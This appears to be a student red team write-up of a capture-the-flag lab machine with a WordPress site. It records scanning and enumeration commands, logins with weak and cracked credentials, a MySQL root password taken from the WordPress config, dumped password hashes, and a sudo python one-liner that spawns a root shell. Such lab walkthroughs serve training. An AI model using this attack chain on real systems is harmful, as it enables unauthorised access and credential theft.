**Red Team Assessment (Target 1)**

**1. Scanning**

1. Run An Initial Nmap Scan

Command: nmap -sT -A -p- -Pn -T4 --reason -oA host-1-scan 192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_1.png" width=50% height=50%>

**2. Enumeration**

2.1 Enumerating SSH (Port 22)

2.1.1 Enumerating The SSH Package Version

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_3.png" width=30% height=30%>

2.2 Enumerating HTTP (Port 80)

2.2.1 Enumerating Hidden Subdirectories

Command: dirb http://192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_4.png" width=50% height=50%>

2.2.2 Enumerating Wordpress Files And Version

Command: wpscan --url http://192.168.1.110/wordpress

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_8.png" width=50% height=50%>

2.2.3 Enumerating Wordpress Users

Command: wpscan [http://192.168.1.110/wordpress/](http://192.168.1.110) --enumerate u

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_9.png" width=50% height=50%>

2.3 Enumerating NetBIOS (Port 139)

2.3.1 Enumerating The NetBIOS Hostname

Command: nbtscan 192.168.1.110

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_5.png" width=50% height=50%>

2.4 Enumerating SMB (Port 445)

2.4.1 Enumerating SMB Shares

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_6.png" width=50% height=50%>

Enumeration Summary

1. Target OS - Linux (Debian)

2. SSH Version - Open SSH 6.7

3. Wordpress Version - Wordpress 4.8.18

4. Wordpress Users - Michael, Steven

5. NetBios Hostname - TARGET1

6. SMB Version - Samba 4.2.14

**3. Exploitation**

3.1 Log Into The Machine Using The Weak Credentials For The User Michael

Credentials - michael:michael

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Red_10.png" width=60% height=60%>

**Flag 1**

Location: /var/www/html/service.html

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Flag_1.png" width=30% height=30%>

**Flag 2**

Location: /var/www

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Flag_2.png" width=30% height=30%>

3.2 Enumerate The Wordpress Directory In The Apache Web Root

Web Root: /var/www/html

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Flag_4.png" width=70% height=70%>

3.3 Enumerate The Wordpress Configuration File

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/MySQL_3.png" width=40% height=40%>

Credentials Found - root:R@v3nSecurity

3.4 Connect To The MySQL Database

Command: mysql -uroot -pR@v3nSecurity

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/MySQL_1.png" width=50% height=50%>

3.5 Enumerate The Wordpress Database

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/MySQL_2.png" width=50% height=50%>

Hashes Found:

michael:$P$BjRvZQ.VQcGZ1DeiKToCQd.cPw5XCe0

steven:$P$BkJVD9jsxx/loJoqNsURgHiaB23j7W/

**Flag 3**

Location: Wordpress Database -> Wordpress Posts Table

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/Flag_3.png" width=50% height=50%>

3.6 Crack Stevens Password Hash Using John The Ripper

Command: john --wordlist /usr/share/wordlists/rockyou.txt hashes.txt

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/John_1.png" width=50% height=50%>

Credentials Found - steven:pink84

3.7 Log Into The Machine Using The Found Credentials

<img src= "https://github.com/SundownRider/Final-Project/blob/main/Images/Red-Team/John_2.png" width=50% height=50%>

**4. Local Enumeration**

4.1 Check Sudo Privileges On The Machine

Command: sudo -l

![John_3.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/b796820f0ce04d47aaef0cf3d1d4b161.png)

4.2 Check GTFO Bins For A Python Sudo Exploit

![John_4.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/568ce1b832cb4118902596f3d73ca30a.png)

**5. Privilege Escalation**

5.1 Spawn The System Shell As the Root User

Command: sudo python -c 'import os; os.system("/bin/sh")'

![Root_1.png](file:///C:/Users/drewa/.config/joplin-desktop/resources/7c1ce811b923431ea44a28c86d3e8a2b.png)

**Flag 4**

Location: /root
